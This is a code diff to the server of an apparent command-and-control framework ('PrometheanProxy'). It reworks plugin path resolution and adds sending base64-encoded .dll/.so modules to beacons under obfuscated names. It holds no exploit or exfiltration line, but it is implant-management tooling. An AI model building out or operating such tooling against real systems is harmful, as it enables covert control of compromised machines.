@@ -5,7 +5,8 @@ from ..global_objects import (
     command_list,
     beacon_list,
     logger,
-    tab_completion
+    tab_completion,
+    obfuscation_map,
 )
 
 import base64
@@ -91,34 +92,38 @@ class Beacon:
         return
 
     def load_module_beacon(self, userID) -> None:
-        # Determine module base (prefer new unified path, fall back to legacy)
+        # Determine module base (prefer unified path, fall back to legacy)
         def _resolve_module_base() -> str:
             candidates = [
                 os.path.expanduser(self.config['server'].get('module_location', '')),
-                os.path.expanduser('~/.PrometheanProxy/plugins/Plugins'),
+                os.path.expanduser('~/.PrometheanProxy/plugins'),
             ]
             for c in candidates:
                 if c and os.path.isdir(c):
                     return c
-            # Default to new location if nothing exists yet
-            return os.path.expanduser('~/.PrometheanProxy/plugins/Plugins')
+            # Default to unified location if nothing exists yet
+            return os.path.expanduser('~/.PrometheanProxy/plugins')
 
         command_location = _resolve_module_base()
+        repo_plugins = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../Plugins"))
         try:
             platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
             ext = '.dll' if platform_folder == 'windows' else '.so'
             channel = 'debug' if 'debug' in self.operating_system else 'release'
             module_names: list[str] = []
 
-            # Legacy structure has OS folders at root
+            # Legacy structure has OS folders at root (linux/windows/<channel>/*.ext)
             legacy_linux = os.path.join(command_location, 'linux')
             legacy_windows = os.path.join(command_location, 'windows')
             if os.path.isdir(legacy_linux) or os.path.isdir(legacy_windows):
-                module_dir = os.path.join(command_location, platform_folder)
-                files = [f for f in os.listdir(module_dir) if f.endswith(ext)]
+                files: list[str] = []
+                for ch in ('release', 'debug'):
+                    d = os.path.join(command_location, platform_folder, ch)
+                    if os.path.isdir(d):
+                        files.extend([f for f in os.listdir(d) if f.endswith(ext)])
                 module_names = [os.path.splitext(f)[0].removesuffix('-debug') for f in files]
             else:
-                # New unified structure: Plugins/<name>/{release,debug}/{name}[ -debug].ext
+                # Unified structure: <name>/{release,debug}/{name}[ -debug].ext
                 for name in os.listdir(command_location):
                     full = os.path.join(command_location, name)
                     if not os.path.isdir(full):
@@ -128,6 +133,17 @@ class Beacon:
                     if os.path.isfile(cand):
                         module_names.append(name)
 
+                # Fallback to repo tree if none found in user directory
+                if not module_names and os.path.isdir(repo_plugins):
+                    for name in os.listdir(repo_plugins):
+                        full = os.path.join(repo_plugins, name)
+                        if not os.path.isdir(full):
+                            continue
+                        fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
+                        cand = os.path.join(full, channel, fname)
+                        if os.path.isfile(cand):
+                            module_names.append(name)
+
             print("Available modules:")
             for name in sorted(set(module_names)):
                 print(f" - {name}")
@@ -136,7 +152,7 @@ class Beacon:
             print(f"Error listing modules in {command_location}: {e}")
             return
         readline.set_completer(
-                lambda text, state: tab_completion(text, state, list(module_names) + ["exit"]))
+            lambda text, state: tab_completion(text, state, list(module_names) + ["exit"]))
         module_name = input("Enter the module name to load: ")
         if not module_name:
             print("No module name provided.")
@@ -153,46 +169,65 @@ class Beacon:
         Loads a module directly by its name.
         This is used when the module is already known and does not require user input.
         """
-        # Resolve module base (prefer new unified structure)
+        # Resolve module base (prefer unified structure under ~/.PrometheanProxy/plugins)
         def _resolve_module_base() -> str:
             candidates = [
                 os.path.expanduser(self.config['server'].get('module_location', '')),
-                os.path.expanduser('~/.PrometheanProxy/plugins/Plugins'),
+                os.path.expanduser('~/.PrometheanProxy/plugins'),
             ]
             for c in candidates:
                 if c and os.path.isdir(c):
                     return c
-            return os.path.expanduser('~/.PrometheanProxy/plugins/Plugins')
+            return os.path.expanduser('~/.PrometheanProxy/plugins')
 
         command_location = os.path.abspath(_resolve_module_base())
+        repo_plugins = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../Plugins"))
         platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
         ext = '.dll' if platform_folder == 'windows' else '.so'
         channel = 'debug' if 'debug' in self.operating_system else 'release'
 
-        # New layout: Plugins/<name>/{release,debug}/{name}[ -debug].ext
+        # Unified layout: <name>/{release,debug}/{name}[ -debug].ext
         filename = f"{module_name}{'-debug' if channel=='debug' else ''}{ext}"
         module_path = os.path.join(command_location, module_name, channel, filename)
         # Fallback to legacy if not present
         if not os.path.isfile(module_path):
             legacy_base = os.path.expanduser(self.config['server'].get('module_location', ''))
-            if platform_folder == 'windows':
-                legacy_try = os.path.join(legacy_base, 'windows', channel, f"{module_name}{'-debug' if channel=='debug' else ''}.dll")
-            else:
-                legacy_try = os.path.join(legacy_base, 'linux', channel, f"{module_name}{'-debug' if channel=='debug' else ''}.so")
+            legacy_try = os.path.join(legacy_base, 'windows' if platform_folder == 'windows' else 'linux', channel, f"{module_name}{'-debug' if channel=='debug' else ''}{ext}")
             if os.path.isfile(legacy_try):
                 module_path = legacy_try
 
-        if not (ext and module_path):
-            logger.error(f"Unsupported operating system: {self.operating_system}")
-            print(f"Unsupported operating system: {self.operating_system}")
+        # Fallback to repo tree if still missing
+        if not os.path.isfile(module_path) and os.path.isdir(repo_plugins):
+            repo_try = os.path.join(repo_plugins, module_name, channel, filename)
+            if os.path.isfile(repo_try):
+                module_path = repo_try
+
+        if not os.path.isfile(module_path):
+            logger.error(f"Module file for '{module_name}' not found in expected locations.")
+            print(f"Module file for '{module_name}' not found.")
             return
+
         module_path = os.path.abspath(os.path.expanduser(module_path))
         logger.debug(f"Loading module '{module_name}' for userID: {userID} from path: {module_path}")
         try:
             with open(module_path, "rb") as module_file:
                 file_data = module_file.read()
                 file_data = base64.b64encode(file_data).decode('utf-8')
-                add_beacon_command_list(userID, None, "module", {"name": module_name, "data": file_data})
+
+                obf_name = module_name
+                try:
+                    entry = obfuscation_map.get(module_name)
+                    if isinstance(entry, dict):
+                        obf_name = entry.get("obfuscated_name") or module_name
+                except Exception:
+                    obf_name = module_name
+
+                add_beacon_command_list(
+                    userID,
+                    None,
+                    "module",
+                    {"name": obf_name, "data": file_data},
+                )
             logger.debug(f"Module '{module_name}' added to command list for userID: {userID}")
             if module_name not in self.loaded_modules:
                 self.loaded_modules.append(module_name)
